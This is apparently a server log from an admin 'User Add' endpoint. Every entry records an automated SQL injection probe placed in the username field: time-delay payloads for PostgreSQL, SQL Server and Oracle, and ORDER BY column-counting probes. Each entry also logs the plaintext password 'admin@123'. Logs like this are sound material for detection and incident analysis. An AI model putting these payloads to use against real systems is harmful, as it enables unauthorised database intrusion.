[2025-03-18 17:12:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4101SELECT4101FROMPG_SLEEP5ANDfPBrfPBr","district":"Bagalkote","newpassword":"admin@123"} | adminAND4101SELECT4101FROMPG_SLEEP5ANDfPBrfPBr
[2025-03-18 17:12:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4101SELECT4101FROMPG_SLEEP5ANDTzovTzov","district":"Bagalkote","newpassword":"admin@123"} | adminAND4101SELECT4101FROMPG_SLEEP5ANDTzovTzov
[2025-03-18 17:12:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4101SELECT4101FROMPG_SLEEP5--nTPm","district":"Bagalkote","newpassword":"admin@123"} | adminAND4101SELECT4101FROMPG_SLEEP5--nTPm
[2025-03-18 17:12:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005AND59835983","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005AND59835983
[2025-03-18 17:12:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005ANDeJvWeJvW","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005ANDeJvWeJvW
[2025-03-18 17:12:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005ANDpvMqpvMq","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005ANDpvMqpvMq
[2025-03-18 17:12:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFORDELAY005--HwMN","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFORDELAY005--HwMN
[2025-03-18 17:12:47] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855AND56885688","district":"Bagalkote","newpassword":"admin@123"} | adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855AND56885688
[2025-03-18 17:12:47] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855","district":"Bagalkote","newpassword":"admin@123"} | adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855
[2025-03-18 17:12:47] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855ANDAPnuAPnu","district":"Bagalkote","newpassword":"admin@123"} | adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855ANDAPnuAPnu
[2025-03-18 17:12:47] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855ANDTvkNTvkN","district":"Bagalkote","newpassword":"admin@123"} | adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855ANDTvkNTvkN
[2025-03-18 17:12:47] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855--TbnO","district":"Bagalkote","newpassword":"admin@123"} | adminAND5710DBMS_PIPE.RECEIVE_MESSAGECHR113CHR98CHR77CHR855--TbnO
[2025-03-18 17:12:50] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--UxRo","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--UxRo
[2025-03-18 17:12:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY3470--gLLa","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY3470--gLLa
[2025-03-18 17:12:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--doac","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--doac
[2025-03-18 17:12:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY2593--QagG","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY2593--QagG
[2025-03-18 17:12:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--eDvE","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--eDvE
[2025-03-18 17:12:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY4760--Tepz","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY4760--Tepz
[2025-03-18 17:12:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--YcwQ","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--YcwQ
[2025-03-18 17:12:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY2486--QdFE","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY2486--QdFE
[2025-03-18 17:12:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY1--WQwB","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY1--WQwB
[2025-03-18 17:12:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminORDERBY4857--FQSY","district":"Bagalkote","newpassword":"admin@123"} | adminORDERBY4857--FQSY
